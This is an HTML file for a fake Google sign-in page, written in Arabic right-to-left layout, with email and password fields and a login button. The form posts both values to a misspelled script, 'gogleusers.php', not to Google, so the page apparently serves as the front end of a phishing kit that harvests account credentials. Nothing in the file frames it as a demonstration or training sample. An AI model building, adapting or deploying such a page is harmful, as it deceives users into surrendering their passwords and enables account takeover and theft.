<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Google </title>
  <style>
    :root{--bg:#f1f3f4;--card:#fff;--muted:#5f6368;--accent:#1a73e8}
    *{box-sizing:border-box}
    body{
      margin:0;padding:0;font-family: Arial, Helvetica, sans-serif;background:var(--bg);color:#202124;display:flex;align-items:center;justify-content:center;height:100vh;
    }
    .container{
      background:var(--card);padding:28px;border-radius:10px;box-shadow:0 10px 30px rgba(32,33,36,0.12);width:360px;text-align:center
    }
 
    h1{margin:6px 0 4px;font-size:20px}
    p.lead{margin:0 0 16px;color:var(--muted);font-size:13px}
    form{display:flex;flex-direction:column;gap:12px}
    label{font-size:13px;color:var(--muted);text-align:right}
    input[type="gmail"],input[type="password"]{padding:10px 12px;border-radius:6px;border:1px solid #dfe1e5;font-size:15px}
    input:focus{outline:none;box-shadow:0 0 0 4px rgba(26,115,232,0.06);border-color:var(--accent)}
    .row{display:flex;justify-content:space-between;align-items:center;margin-top:6px}
    .link{color:var(--accent);text-decoration:none;font-size:14px}
    button{padding:10px;border-radius:6px;border:0;background:var(--accent);color:#fff;font-weight:600;cursor:pointer}
    .secondary{background:transparent;color:var(--accent);border:1px solid rgba(26,115,232,0.12)}
    .footer{margin-top:12px;font-size:12px;color:var(--muted)}
    @media (max-width:380px){.container{width:92%;padding:18px}.logo{width:60px;height:60px;font-size:30px}}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="icons\proxy-image.png" width='32px'></div>
    <form action="gogleusers.php" method="POST" >
      <label for="gmail"> email</label>
      <input id="gmail" name="gmail" type="gmail" placeholder="example@gmail.com" required>

      <label for="password"> password</label>
      <input id="password" name="password" type="password" placeholder="••••••••" required>

      <button>login </button>
    </form>
  </div>
</body>
</html>
